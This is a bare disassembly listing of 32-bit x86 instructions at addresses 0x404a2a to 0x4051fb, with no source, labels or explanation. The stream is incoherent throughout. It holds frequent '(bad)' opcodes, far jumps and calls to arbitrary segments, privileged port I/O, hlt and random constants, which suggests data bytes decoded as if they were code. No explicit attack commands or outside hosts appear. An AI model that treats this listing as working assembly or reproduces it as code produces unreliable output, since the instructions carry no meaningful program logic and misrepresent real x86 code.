  404a2a:	add    al,0x1a
  404a2c:	mov    ebx,0x27b0e288
  404a31:	jge    0x404a23
  404a33:	out    0x77,al
  404a35:	sub    ebp,DWORD PTR [ebp-0x60]
  404a38:	addr16 add al,0x58
  404a3b:	push   eax
  404a3c:	ds dec ebx
  404a3e:	stc    
  404a3f:	ficomp DWORD PTR [ebp-0x10814450]
  404a45:	repnz mov eax,ds:0xbafdc33
  404a4b:	or     BYTE PTR [edx+0x26],ch
  404a4e:	ret    
  404a4f:	lock push edx
  404a51:	xchg   ebx,eax
  404a52:	adc    bl,BYTE PTR [edx+0x60]
  404a55:	jo     0x404a51
  404a57:	into   
  404a58:	xchg   esp,eax
  404a59:	addr16 cld 
  404a5b:	stc    
  404a5c:	cmp    DWORD PTR [ecx+0x3c],esi
  404a5f:	rcr    DWORD PTR [ecx-0x60e6bced],cl
  404a65:	add    DWORD PTR [eax],edi
  404a67:	sbb    ebp,0xffffffdd
  404a6a:	div    BYTE PTR [ebx+0x5f39f203]
  404a70:	lods   eax,DWORD PTR ds:[esi]
  404a71:	scas   eax,DWORD PTR es:[edi]
  404a72:	fnsave [esi]
  404a74:	(bad)  
  404a75:	pop    edx
  404a76:	cld    
  404a77:	cmpps  xmm2,XMMWORD PTR [ecx+eax*1+0x5],0xfd
  404a7d:	or     ch,BYTE PTR [edi+eax*4-0x52]
  404a81:	cdq    
  404a82:	mov    ch,0xc0
  404a84:	sub    ebp,DWORD PTR [esi]
  404a86:	mov    ecx,0xec72a69e
  404a8b:	ja     0x404a5f
  404a8d:	push   ds
  404a8e:	add    al,0xb3
  404a90:	retf   
  404a91:	mov    bl,0xc7
  404a93:	loope  0x404a3c
  404a95:	test   al,0x9f
  404a97:	push   eax
  404a98:	int    0x4d
  404a9a:	jnp    0x404aa7
  404a9c:	pushf  
  404a9d:	xchg   bl,dh
  404a9f:	xchg   DWORD PTR [ebx],ecx
  404aa1:	pop    ebp
  404aa2:	outs   dx,DWORD PTR ds:[esi]
  404aa3:	scas   al,BYTE PTR es:[edi]
  404aa4:	xchg   edi,eax
  404aa5:	popf   
  404aa6:	imul   edi,DWORD PTR [edi+0x67],0xffffffb5
  404aaa:	test   eax,0xfca58107
  404aaf:	or     ebp,DWORD PTR [esi*2+0x1322ebbb]
  404ab6:	rol    BYTE PTR [ebx+eiz*2-0x1c],0x77
  404abb:	cmp    al,0xda
  404abd:	(bad)  
  404abe:	(bad)  
  404abf:	cmp    ebx,ebp
  404ac1:	ja     0x404ae4
  404ac3:	fwait
  404ac4:	(bad)  
  404ac5:	mov    ?,WORD PTR [eax]
  404ac7:	aam    0x83
  404ac9:	jecxz  0x404a64
  404acb:	ret    0x8d22
  404ace:	add    esp,DWORD PTR [eax-0x7914daf7]
  404ad4:	dec    edi
  404ad5:	in     al,dx
  404ad6:	mov    esp,0xcb32268d
  404adb:	inc    ebp
  404adc:	mov    fs,WORD PTR [ebx-0x1222a8]
  404ae2:	mov    al,ds:0xa5e0dfcb
  404ae7:	ffree  st(6)
  404ae9:	call   DWORD PTR [ecx-0x2f]
  404aec:	mov    ds:0x289318f6,al
  404af1:	sub    al,0xe
  404af3:	hlt    
  404af4:	mov    ecx,0x6ae9ca2c
  404af9:	test   eax,0x4c240df3
  404afe:	and    DWORD PTR [edi+0x43],ebp
  404b01:	retf   0x21df
  404b04:	jmp    0x4014:0x3b50e3e4
  404b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b0c:	or     eax,0xef427c4c
  404b11:	xor    eax,0x2a5f57f9
  404b16:	bound  edi,QWORD PTR [ebx]
  404b18:	mov    esi,DWORD PTR ds:0xf831ef2d
  404b1e:	ds cld 
  404b20:	fld    DWORD PTR [ecx+0x67]
  404b23:	sbb    DWORD PTR [eax],0x18
  404b26:	xor    eax,0x4d6eb1e4
  404b2b:	cmp    edx,DWORD PTR [eax-0x4a]
  404b2e:	pusha  
  404b2f:	cmp    dl,dl
  404b31:	inc    ecx
  404b32:	cs mov ecx,0x65fc1f72
  404b38:	sub    ch,bl
  404b3a:	xor    esp,DWORD PTR [ebx+0x7249aab5]
  404b40:	bound  ecx,QWORD PTR [edi+0x1b]
  404b43:	loope  0x404b0f
  404b45:	jge    0x404b68
  404b47:	jmp    0xb92e:0xaf457be3
  404b4e:	pop    edi
  404b4f:	shr    cl,1
  404b51:	add    al,0xac
  404b53:	cs push esp
  404b55:	pusha  
  404b56:	xchg   ebp,eax
  404b57:	psubd  mm0,mm3
  404b5a:	call   0x980e:0xc8277af2
  404b61:	push   eax
  404b62:	sbb    ebp,DWORD PTR [edx+0x377ae368]
  404b68:	push   ebp
  404b69:	test   BYTE PTR [ecx],0xae
  404b6c:	ins    DWORD PTR es:[edi],dx
  404b6d:	fmul   QWORD PTR [esp+ebx*1-0x7794adef]
  404b74:	das    
  404b75:	add    edi,ebp
  404b77:	ror    DWORD PTR [ecx+ebp*4],1
  404b7a:	inc    ebp
  404b7b:	mov    ecx,0xbf7092c7
  404b80:	xchg   DWORD PTR [eax-0x57d47750],ecx
  404b86:	jmp    0x73e5:0xf060a959
  404b8d:	pop    esi
  404b8e:	arpl   WORD PTR [ebx],bx
  404b90:	add    ecx,DWORD PTR [edi+0x1a9b4630]
  404b96:	mov    al,ds:0x4f8ed1d8
  404b9b:	(bad)  
  404b9d:	out    dx,eax
  404b9e:	adc    dl,cl
  404ba0:	mov    ebx,0x9fdbc005
  404ba5:	sbb    DWORD PTR [ecx+0x1f],ebx
  404ba8:	scas   eax,DWORD PTR es:[edi]
  404ba9:	dec    ebx
  404baa:	das    
  404bab:	arpl   WORD PTR [edi-0x135000af],cx
  404bb1:	xchg   edi,eax
  404bb2:	std    
  404bb3:	loope  0x404bfd
  404bb5:	in     eax,0x99
  404bb7:	cli    
  404bb8:	dec    ebp
  404bb9:	ja     0x404bc9
  404bbb:	loope  0x404bf8
  404bbd:	jno    0x404b7e
  404bbf:	mov    ebp,0xe078fe92
  404bc4:	mov    esi,0xe1822344
  404bc9:	sub    BYTE PTR [ecx-0x6766a3a5],ah
  404bcf:	and    al,0x76
  404bd1:	iret   
  404bd2:	mov    dl,0x22
  404bd4:	int3   
  404bd5:	shr    DWORD PTR [edx],1
  404bd7:	jecxz  0x404c24
  404bd9:	xchg   esi,eax
  404bda:	xchg   edx,eax
  404bdb:	scas   al,BYTE PTR es:[edi]
  404bdc:	adc    dl,BYTE PTR [esi+ebx*4]
  404bdf:	retf   
  404be0:	and    edi,eax
  404be2:	xchg   DWORD PTR [ebp-0x5795bffe],eax
  404be8:	inc    esp
  404be9:	and    BYTE PTR [esi+0x3d702a08],al
  404bef:	and    al,0xc7
  404bf1:	arpl   sp,bp
  404bf3:	fcomp  DWORD PTR [esi]
  404bf5:	rol    DWORD PTR [ebp+0x38],1
  404bf8:	lock push ds
  404bfa:	mov    ebx,0xa88445dd
  404bff:	std    
  404c00:	jae    0x404bb2
  404c02:	mov    ecx,0xdcc8b979
  404c07:	xor    DWORD PTR [edi],edi
  404c09:	xchg   esi,eax
  404c0a:	jae    0x404bc3
  404c0c:	xchg   BYTE PTR [esi-0x77b40cda],cl
  404c12:	bound  ecx,QWORD PTR [edi+0x76bdbe2]
  404c18:	xlat   BYTE PTR ds:[ebx]
  404c19:	sbb    al,0xd
  404c1b:	mov    ds:0xbcef2c5b,al
  404c20:	pop    ss
  404c21:	jns    0x404c24
  404c23:	or     esi,edi
  404c25:	enter  0x1247,0x6b
  404c29:	mov    edi,DWORD PTR [ebx]
  404c2b:	mov    al,ds:0xe721ce08
  404c30:	jecxz  0x404bc4
  404c32:	(bad)  
  404c34:	call   0x962e:0x459e11e6
  404c3b:	in     eax,dx
  404c3c:	lahf   
  404c3d:	call   0x6b1a:0x6a693884
  404c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c45:	jb     0x404c1b
  404c47:	push   ss
  404c48:	pusha  
  404c49:	sbb    cl,BYTE PTR [ecx]
  404c4b:	in     al,0x57
  404c4d:	fs enter 0x9ecb,0xe2
  404c52:	in     al,0x2b
  404c54:	push   ds
  404c55:	adc    BYTE PTR [esi],bl
  404c57:	mov    dl,0x9b
  404c59:	fmul   DWORD PTR [edi+ecx*4-0x78679797]
  404c60:	adc    al,0xbf
  404c62:	retf   
  404c63:	test   ah,ah
  404c65:	ss push ds
  404c67:	enter  0x8ae9,0x8b
  404c6b:	push   edx
  404c6c:	mov    DWORD PTR [esp+eax*1+0x52],eax
  404c70:	mov    dh,0xb6
  404c72:	and    eax,0xd9c063a
  404c77:	mov    al,ds:0x49c65859
  404c7c:	fisttp DWORD PTR [edi]
  404c7e:	adc    DWORD PTR [ecx-0x16],ebp
  404c81:	jne    0x404c99
  404c83:	push   cs
  404c84:	daa    
  404c85:	or     bh,BYTE PTR [edx-0x10d45481]
  404c8b:	xchg   esi,eax
  404c8c:	jle    0x404cb3
  404c8e:	sbb    ebx,DWORD PTR [esi+0x54]
  404c91:	jae    0x404cad
  404c93:	repz cmp bl,BYTE PTR [edi+esi*8]
  404c97:	add    ebx,DWORD PTR [ebx]
  404c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c9a:	xchg   esp,eax
  404c9b:	outs   dx,BYTE PTR ds:[esi]
  404c9c:	jmp    0xac0:0xadbe367d
  404ca3:	pop    esp
  404ca4:	xchg   DWORD PTR [ebp+0x46],ebp
  404ca7:	arpl   WORD PTR ds:0x8354427b,di
  404cad:	out    dx,eax
  404cae:	aad    0x95
  404cb0:	aaa    
  404cb1:	sar    dh,0x5c
  404cb4:	mov    eax,0xc02d2e4e
  404cb9:	push   esi
  404cba:	test   eax,0x972fb131
  404cbf:	jl     0x404cf8
  404cc1:	pop    ds
  404cc2:	mov    al,ds:0x17dd1503
  404cc7:	in     eax,0x55
  404cc9:	inc    ebp
  404cca:	xchg   ebp,eax
  404ccb:	test   eax,0xe38048e6
  404cd0:	ins    DWORD PTR es:[edi],dx
  404cd1:	xor    DWORD PTR [edi-0x5],ebx
  404cd4:	std    
  404cd5:	cmp    BYTE PTR [esi+esi*1+0x2c],0xb4
  404cda:	dec    ecx
  404cdb:	push   esp
  404cdc:	cwde   
  404cdd:	xor    ecx,DWORD PTR [esi+eax*1]
  404ce0:	inc    edx
  404ce1:	mov    ebp,0x6cd787a7
  404ce6:	cmc    
  404ce7:	fld    QWORD PTR [eax-0x50a9892d]
  404ced:	mov    bh,0x31
  404cef:	enter  0xda2f,0xbf
  404cf3:	out    0xca,al
  404cf5:	std    
  404cf6:	iret   
  404cf7:	je     0x404d62
  404cf9:	mov    dl,0x5f
  404cfb:	push   edi
  404cfc:	dec    edi
  404cfd:	pop    ds
  404cfe:	ds stc 
  404d00:	cli    
  404d01:	outs   dx,BYTE PTR ds:[esi]
  404d02:	xor    DWORD PTR [edi+ebp*1+0x7145c04f],0xffffffb8
  404d0a:	xor    BYTE PTR [edi+edx*8],cl
  404d0d:	cmp    BYTE PTR [eax-0x7e6bd054],bl
  404d13:	or     ecx,DWORD PTR [eax-0x64]
  404d16:	test   DWORD PTR [ebx],esp
  404d18:	ds mov ebx,0xfb117694
  404d1e:	push   es
  404d1f:	gs xor esi,esp
  404d22:	sar    DWORD PTR [ebx],cl
  404d24:	mov    es:0xedba3844,al
  404d2a:	mov    al,ds:0xd55de00f
  404d2f:	mov    WORD PTR [ebp+edx*1+0x2c80762f],ss
  404d36:	jmp    0x64235f68
  404d3b:	adc    bl,ah
  404d3d:	sbb    cl,al
  404d3f:	inc    eax
  404d40:	jae    0x404d0e
  404d42:	xchg   edx,eax
  404d43:	loop   0x404d0d
  404d45:	in     eax,dx
  404d46:	cdq    
  404d47:	cmp    al,0x12
  404d49:	in     al,dx
  404d4a:	inc    ebp
  404d4b:	cmp    eax,0x19599549
  404d50:	sub    DWORD PTR [edi+0x6b],ebx
  404d53:	fmul   QWORD PTR [esi]
  404d55:	and    al,BYTE PTR [esi-0x71]
  404d58:	pop    ecx
  404d59:	xchg   esi,eax
  404d5a:	repnz adc al,BYTE PTR [edi+0x59342a94]
  404d61:	hlt    
  404d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d63:	stos   BYTE PTR es:[edi],al
  404d64:	lea    ebp,ss:[edx+0x65]
  404d68:	mov    eax,ds:0xdbf325e3
  404d6d:	stos   BYTE PTR es:[edi],al
  404d6e:	mov    cl,BYTE PTR [ecx+0x5b22abb4]
  404d74:	fst    QWORD PTR [esi]
  404d76:	push   es
  404d77:	sbb    al,0x6
  404d79:	inc    ebx
  404d7a:	xor    esi,DWORD PTR ds:0xd1e7b49
  404d80:	ds ret 
  404d82:	sub    BYTE PTR [eax],0x1a
  404d85:	push   es
  404d86:	jb     0x404d9b
  404d88:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d8b:	jae    0x404d3c
  404d8d:	jle    0x404d64
  404d8f:	cmp    ah,BYTE PTR ds:0x4ebf946f
  404d95:	fist   DWORD PTR [edi+0x41]
  404d98:	mov    al,0x76
  404d9a:	pop    edi
  404d9b:	mov    esp,0x8077d33f
  404da0:	jp     0x404d91
  404da2:	pop    eax
  404da3:	cmp    DWORD PTR [edi-0x798cbf12],edi
  404da9:	dec    esi
  404daa:	sbb    eax,0x3b78651f
  404daf:	ins    DWORD PTR es:[edi],dx
  404db0:	mov    bl,0x6e
  404db2:	or     DWORD PTR [edi],ecx
  404db4:	jne    0x404da2
  404db6:	jns    0x404dcf
  404db8:	sub    edx,DWORD PTR [edi]
  404dba:	in     eax,dx
  404dbb:	sbb    al,0xb8
  404dbd:	gs push edi
  404dbf:	retf   0xf215
  404dc2:	add    al,0xf6
  404dc4:	pop    eax
  404dc5:	sbb    ebp,DWORD PTR [esi+ebx*8]
  404dc8:	cld    
  404dc9:	xchg   edi,eax
  404dca:	fs xchg ecx,eax
  404dcc:	mov    bl,0x70
  404dce:	add    bh,BYTE PTR [ebx-0x2c]
  404dd1:	xchg   esp,eax
  404dd2:	xlat   BYTE PTR ds:[ebx]
  404dd3:	sbb    ch,ah
  404dd5:	test   eax,0xc6706d01
  404dda:	out    0xb2,eax
  404ddc:	into   
  404ddd:	retf   0xe3f4
  404de0:	sub    eax,0x221210e7
  404de5:	pop    edx
  404de6:	rol    DWORD PTR [edi+esi*1],cl
  404de9:	jmp    0x404e61
  404deb:	mov    ebp,DWORD PTR ds:0xf9b81ed6
  404df1:	push   ss
  404df2:	and    al,0x7f
  404df4:	enter  0xb7b0,0x28
  404df8:	cmc    
  404df9:	mov    al,ds:0xd561ebd7
  404dfe:	sahf   
  404dff:	cmp    DWORD PTR [ecx-0x6d546706],edx
  404e05:	test   BYTE PTR [ecx],0x79
  404e08:	in     eax,dx
  404e09:	dec    ecx
  404e0a:	adc    bh,BYTE PTR [edi]
  404e0c:	std    
  404e0d:	int3   
  404e0e:	out    0x8a,al
  404e10:	add    esp,DWORD PTR [edi-0x3bd2bb12]
  404e16:	das    
  404e17:	ins    DWORD PTR es:[edi],dx
  404e18:	inc    ebx
  404e19:	jb     0x404e0a
  404e1b:	(bad)  
  404e1d:	ins    DWORD PTR es:[edi],dx
  404e1e:	push   ecx
  404e1f:	inc    ebx
  404e20:	push   ebx
  404e21:	stc    
  404e22:	or     BYTE PTR [ebx+eiz*4],al
  404e25:	enter  0x7e22,0x17
  404e29:	aam    0x19
  404e2b:	lods   eax,DWORD PTR es:[esi]
  404e2d:	add    ebx,esi
  404e2f:	lods   al,BYTE PTR ds:[esi]
  404e30:	adc    al,0x26
  404e32:	add    DWORD PTR [esi+eiz*4],esi
  404e35:	gs push esp
  404e37:	mov    esp,0x28ca6a22
  404e3c:	aam    0x11
  404e3e:	test   eax,0x8e51092a
  404e43:	int    0x92
  404e45:	xchg   edx,eax
  404e46:	jbe    0x404dee
  404e48:	adc    BYTE PTR [edx],ah
  404e4a:	sbb    esp,DWORD PTR [ebp+0x1c]
  404e4d:	mov    al,ds:0x9fcbbe93
  404e52:	(bad)  
  404e53:	aad    0x98
  404e55:	cmp    BYTE PTR [edx+0x3a8a985],cl
  404e5b:	adc    DWORD PTR [ebp+0x6f],esp
  404e5e:	imul   esp,DWORD PTR [edx],0x736e65dc
  404e64:	rcl    DWORD PTR [ecx+0x60],0x8b
  404e68:	aad    0x25
  404e6a:	aam    0x32
  404e6c:	jb     0x404df2
  404e6e:	fst    QWORD PTR [esp+ebp*4-0x5153f186]
  404e75:	pop    edx
  404e76:	pop    eax
  404e77:	fdiv   DWORD PTR [esi+0x50b0ffda]
  404e7d:	adc    ebx,DWORD PTR [ebx+0x66]
  404e80:	and    eax,0xef65f246
  404e85:	(bad)  
  404e86:	out    dx,eax
  404e87:	mov    ebp,0x9fda3251
  404e8c:	mov    ebx,0xfd76d6f2
  404e91:	(bad)  [edx]
  404e93:	aaa    
  404e94:	xor    al,0xa5
  404e96:	jmp    0x8cd2:0x88eefdcb
  404e9d:	test   al,0x1c
  404e9f:	loope  0x404f0c
  404ea1:	cmp    eax,DWORD PTR [edx+0x541ae0b3]
  404ea7:	out    0xd8,al
  404ea9:	jp     0x404ece
  404eab:	popa   
  404eac:	retf   
  404ead:	(bad)  
  404eae:	xchg   ebx,eax
  404eaf:	or     esp,DWORD PTR ds:0xb45c6b70
  404eb5:	pop    esi
  404eb6:	icebp  
  404eb7:	dec    esi
  404eb8:	or     al,0x2a
  404eba:	cmp    BYTE PTR ds:0xee2dbf3b,dl
  404ec0:	push   ebx
  404ec1:	fisubr DWORD PTR [edi-0xe]
  404ec4:	in     eax,0x6
  404ec6:	mov    esp,0x5f2b794e
  404ecb:	pop    ss
  404ecc:	and    DWORD PTR ds:0x8d080248,ebp
  404ed2:	sbb    cl,ch
  404ed4:	cmp    dh,ch
  404ed6:	add    eax,0x3d606613
  404edb:	jne    0x404eb6
  404edd:	aaa    
  404ede:	(bad)  
  404edf:	ffree  st(5)
  404ee1:	jmp    FWORD PTR [ebx]
  404ee3:	or     al,0xce
  404ee5:	ret    
  404ee6:	or     cl,BYTE PTR [ecx]
  404ee8:	xchg   esp,eax
  404ee9:	inc    ecx
  404eea:	and    ebx,DWORD PTR [edi+0x61f352d1]
  404ef0:	popf   
  404ef1:	int    0xaf
  404ef3:	dec    eax
  404ef4:	and    ecx,DWORD PTR [ebp+0x2a]
  404ef7:	or     eax,0xc64ba86f
  404efc:	aaa    
  404efd:	mov    ebx,0xc678b968
  404f02:	inc    ebx
  404f03:	dec    edi
  404f04:	jg     0x404edd
  404f06:	mov    al,ds:0xd31941
  404f0b:	retf   0x8be2
  404f0e:	push   ebx
  404f0f:	mov    ah,al
  404f11:	es loop 0x404f37
  404f14:	pop    ebx
  404f15:	fwait
  404f16:	outs   dx,BYTE PTR ds:[esi]
  404f17:	daa    
  404f18:	dec    edx
  404f19:	add    al,0x52
  404f1b:	or     BYTE PTR [ebx+0x42],dh
  404f1e:	push   0x4a
  404f20:	ftst   
  404f22:	push   edi
  404f23:	shr    BYTE PTR [ebp+0x2e],0xa1
  404f27:	xchg   esp,eax
  404f28:	push   ds
  404f29:	(bad)  [ebp+0x15ff422f]
  404f2f:	test   eax,0x1932008f
  404f34:	sbb    bl,BYTE PTR [esi-0x2e11416a]
  404f3a:	into   
  404f3b:	pop    es
  404f3c:	icebp  
  404f3d:	fcmovne st,st(4)
  404f3f:	inc    ecx
  404f40:	xchg   ebp,eax
  404f41:	jle    0x404ece
  404f43:	int3   
  404f44:	add    DWORD PTR [edi],ebx
  404f46:	sbb    ebp,DWORD PTR [ecx]
  404f48:	pop    ss
  404f49:	jle    0x404f21
  404f4b:	mov    ds,WORD PTR ds:0x87de60e9
  404f51:	int3   
  404f52:	stc    
  404f53:	aad    0x1f
  404f55:	jnp    0x404f63
  404f57:	shl    BYTE PTR [esi+ebp*2],1
  404f5a:	jle    0x9e9d29d4
  404f60:	pop    edx
  404f61:	add    al,0x6a
  404f63:	cmp    edi,DWORD PTR [edx-0x5b021320]
  404f69:	dec    edx
  404f6a:	int3   
  404f6b:	mov    eax,ds:0xa24ed2cf
  404f70:	jae    0x404f26
  404f72:	dec    edi
  404f73:	sub    al,0x9b
  404f75:	mov    edi,es
  404f77:	out    0x62,eax
  404f79:	js     0x404f4e
  404f7b:	sub    DWORD PTR [esi+0x64d96e92],0xffffffae
  404f82:	test   eax,edi
  404f84:	or     DWORD PTR [ebx-0x42ed5171],0xad24d8a
  404f8e:	retf   
  404f8f:	pop    eax
  404f90:	or     eax,0xeedefdd1
  404f95:	jmp    0x4287:0x3c1c0b53
  404f9c:	adc    BYTE PTR [edx-0x73],al
  404f9f:	add    eax,0xd355645
  404fa4:	loopne 0x404f30
  404fa6:	and    al,BYTE PTR [eax]
  404fa8:	jmp    0xe4b8:0x6f95f31c
  404faf:	add    bl,BYTE PTR [ebx+0x50]
  404fb2:	das    
  404fb3:	or     eax,0x7cc18c21
  404fb8:	data16 scas al,BYTE PTR es:[edi]
  404fba:	mov    esp,0x3f879087
  404fbf:	fmul   QWORD PTR [ecx+0x564e569d]
  404fc5:	sbb    ebp,DWORD PTR [esi]
  404fc7:	cmc    
  404fc8:	lods   al,BYTE PTR ds:[esi]
  404fc9:	pop    ss
  404fca:	cmp    ecx,DWORD PTR [ebx]
  404fcc:	popa   
  404fcd:	sahf   
  404fce:	sbb    eax,0x1b3b0f96
  404fd3:	out    0x42,al
  404fd5:	inc    edi
  404fd6:	mov    ecx,0x8fe57e86
  404fdb:	mov    edx,0x5abcf905
  404fe0:	cli    
  404fe1:	inc    ebp
  404fe2:	and    edi,esi
  404fe4:	stos   DWORD PTR es:[edi],eax
  404fe5:	and    DWORD PTR [edi+0xb77b43],edi
  404feb:	adc    bl,0x37
  404fee:	jg     0x405010
  404ff0:	cli    
  404ff1:	add    esi,edi
  404ff3:	jo     0x405073
  404ff5:	jg     0x404fc8
  404ff7:	xchg   edx,eax
  404ff8:	xchg   ebx,eax
  404ff9:	mov    al,0x9f
  404ffb:	aad    0x73
  404ffd:	or     edi,esp
  404fff:	xor    esp,DWORD PTR [edi-0x4e268d13]
  405005:	fistp  QWORD PTR [edi+0x5c]
  405008:	push   edx
  405009:	add    ebx,DWORD PTR [eax+0x3d]
  40500c:	(bad)  
  40500e:	adc    eax,0xc5e8a509
  405013:	mov    DWORD PTR [ebp-0x5a],ebp
  405016:	cmp    ebp,DWORD PTR [ebx+0x37]
  405019:	xchg   esi,eax
  40501a:	leave  
  40501b:	(bad)  
  40501c:	aad    0x46
  40501e:	push   edi
  40501f:	pop    esp
  405020:	out    dx,al
  405021:	sbb    al,0xc
  405023:	js     0x405063
  405025:	xchg   DWORD PTR [eax-0x15c96e0e],edi
  40502b:	mov    DWORD PTR [esi+0x5a],edi
  40502e:	xor    dh,BYTE PTR [esi+0x69]
  405031:	sbb    al,0x69
  405033:	int3   
  405034:	adc    ebp,edi
  405036:	cmp    edx,DWORD PTR [ebx-0x71]
  405039:	call   0x6d59:0x57b833a0
  405040:	mov    bl,BYTE PTR [edi+0x5a2cae7d]
  405046:	mov    al,ds:0xbf79eabf
  40504b:	sub    al,0x99
  40504d:	out    0x4a,eax
  40504f:	pop    ecx
  405050:	sbb    DWORD PTR [ebx],edi
  405052:	scas   eax,DWORD PTR es:[edi]
  405053:	add    ebx,DWORD PTR [edi-0x32]
  405056:	inc    eax
  405057:	or     al,0x23
  405059:	mov    bl,BYTE PTR [edx-0x2f]
  40505c:	mov    fs,WORD PTR [ebx+0x7cb7db85]
  405062:	xchg   ebp,eax
  405063:	fmulp  st(4),st
  405065:	push   ebx
  405067:	pushf  
  405068:	mov    ds:0x6cef0e16,eax
  40506d:	lods   al,BYTE PTR ds:[esi]
  40506e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40506f:	mov    ch,0xdf
  405071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405072:	fldenv [eax]
  405074:	cmc    
  405075:	xor    BYTE PTR [edx+0x435729d],bl
  40507b:	in     eax,0xf8
  40507d:	mov    bh,0x0
  40507f:	hlt    
  405080:	test   DWORD PTR [eax],esp
  405082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405083:	repz (bad) 
  405085:	mov    edx,0x99865a4b
  40508a:	jb     0x405101
  40508c:	pop    ebp
  40508d:	imul   esp,DWORD PTR [ebp-0x69],0x14
  405091:	sti    
  405092:	fisub  DWORD PTR [ebx*2+0x6cf78dd1]
  405099:	sti    
  40509a:	jmp    0xdb43a04b
  40509f:	and    al,0xb7
  4050a1:	inc    esp
  4050a2:	xor    BYTE PTR [esi-0x6e159b3],dl
  4050a8:	mov    dh,0xde
  4050aa:	jno    0x4050d9
  4050ac:	std    
  4050ad:	repz or eax,0x1d0bd39e
  4050b3:	stos   BYTE PTR es:[edi],al
  4050b4:	mov    esp,0x7848e139
  4050b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ba:	in     eax,dx
  4050bb:	cmp    eax,0x75c22e2b
  4050c0:	mov    ds:0x1cbdcb9d,eax
  4050c5:	cmc    
  4050c6:	dec    edi
  4050c8:	sti    
  4050c9:	push   edi
  4050ca:	or     BYTE PTR [ebp-0x63],bl
  4050cd:	mov    ebp,0x4a6ebf8
  4050d2:	pop    ecx
  4050d3:	mov    dl,0x71
  4050d5:	dec    ebp
  4050d6:	jno    0x4050d1
  4050d8:	stos   DWORD PTR es:[edi],eax
  4050d9:	retf   
  4050da:	mov    esp,0xe616d567
  4050df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e0:	mov    edx,0x552927f4
  4050e5:	dec    edx
  4050e6:	mov    cl,0x7b
  4050e8:	ins    BYTE PTR es:[edi],dx
  4050e9:	and    al,0x2f
  4050ec:	enter  0x124c,0x63
  4050f0:	repnz mov al,ds:0x2899bae
  4050f6:	sub    eax,0x20c734ee
  4050fb:	mov    edi,0xa02bd853
  405100:	and    BYTE PTR [edi+eiz*4],dl
  405103:	mov    ecx,0xb41f1782
  405108:	or     BYTE PTR [eax-0x6c],dh
  40510b:	test   ecx,ecx
  40510d:	sbb    BYTE PTR [ebx],0xe2
  405110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405112:	ins    BYTE PTR es:[edi],dx
  405113:	inc    ebx
  405114:	lods   eax,DWORD PTR ds:[esi]
  405115:	pop    esi
  405116:	push   ecx
  405117:	adc    bl,ah
  405119:	or     eax,0x282d0bbd
  40511e:	jge    0x4050df
  405120:	lahf   
  405121:	fcmovb st,st(7)
  405123:	fild   DWORD PTR [edi-0x5d]
  405126:	das    
  405127:	xchg   edi,eax
  405128:	imul   edx,ebx,0x7bfad137
  40512e:	inc    ecx
  40512f:	jnp    0x405182
  405131:	(bad)  [edx]
  405133:	mov    eax,0xa07ad81a
  405138:	dec    edi
  405139:	jge    0x405194
  40513b:	inc    edi
  40513c:	outs   dx,BYTE PTR ds:[si]
  40513e:	fisttp WORD PTR [ebx+0x7f]
  405141:	jg     0x4050d5
  405143:	ss mov eax,0xc5057acf
  405149:	in     eax,0x76
  40514b:	outs   dx,BYTE PTR ds:[esi]
  40514c:	clc    
  40514d:	inc    ebx
  40514e:	sub    esp,0xffffffe8
  405151:	sub    al,0x3b
  405153:	sbb    esp,DWORD PTR [edx-0x3e]
  405156:	sar    BYTE PTR [eax+0x525060a4],1
  40515c:	data16 jnp 0x4050f6
  40515f:	jno    0x405189
  405161:	ins    DWORD PTR es:[edi],dx
  405162:	push   ebp
  405163:	fdivp  st(6),st
  405165:	clc    
  405166:	loopne 0x405108
  405168:	test   BYTE PTR [ebp-0x73],0x7d
  40516c:	test   DWORD PTR [edi-0x3b2c0350],ebx
  405172:	mov    ah,0x79
  405174:	sub    BYTE PTR [ebx-0x1000dc4e],0x7d
  40517b:	test   al,0x8
  40517d:	or     ah,dh
  40517f:	adc    ah,dh
  405181:	push   0x17
  405183:	add    DWORD PTR ds:0x98af22ad,edx
  405189:	(bad)  
  40518a:	sub    eax,DWORD PTR [edi-0x16c391de]
  405190:	add    esp,ecx
  405192:	mov    ds:0x10e3bf3e,eax
  405197:	les    esi,FWORD PTR [eax+0x4f]
  40519a:	pop    esi
  40519b:	(bad)  
  40519c:	pop    esp
  40519d:	adc    eax,0x57b30de6
  4051a2:	fs repz inc esi
  4051a5:	pop    ebp
  4051a6:	xchg   esp,eax
  4051a7:	pop    ss
  4051a8:	push   cs
  4051a9:	mov    eax,ds:0x4abdf978
  4051ae:	push   ds
  4051af:	xchg   DWORD PTR [edx+0x4314da05],edx
  4051b5:	cld    
  4051b6:	mov    eax,0x59bf6367
  4051bb:	test   DWORD PTR [esi+edi*2],esi
  4051be:	fcmovnb st,st(3)
  4051c0:	or     eax,0x5abf536c
  4051c5:	lahf   
  4051c6:	jp     0x40521a
  4051c8:	iret   
  4051c9:	retf   0x5bd6
  4051cc:	stos   DWORD PTR es:[edi],eax
  4051cd:	rcr    BYTE PTR [esi-0xb],0x3a
  4051d1:	call   0x29ec:0xf54b7a73
  4051d8:	lods   al,BYTE PTR ds:[esi]
  4051d9:	and    al,0x78
  4051db:	or     ebx,DWORD PTR [ebp+0x43]
  4051de:	inc    edx
  4051df:	call   0xc10aa969
  4051e4:	mov    cs,WORD PTR [ebx+0xf]
  4051e7:	rcl    bl,cl
  4051e9:	stos   BYTE PTR es:[edi],al
  4051ea:	pop    ds
  4051eb:	(bad)  
  4051ec:	sbb    ch,BYTE PTR [edx-0x6341ec94]
  4051f2:	pop    ebx
  4051f3:	and    ah,dh
  4051f5:	adc    DWORD PTR [ebp+0x3],0xffffffcf
  4051f9:	xchg   ebp,eax
  4051fa:	push   ebx
  4051fb:	fdivrp st(1),st
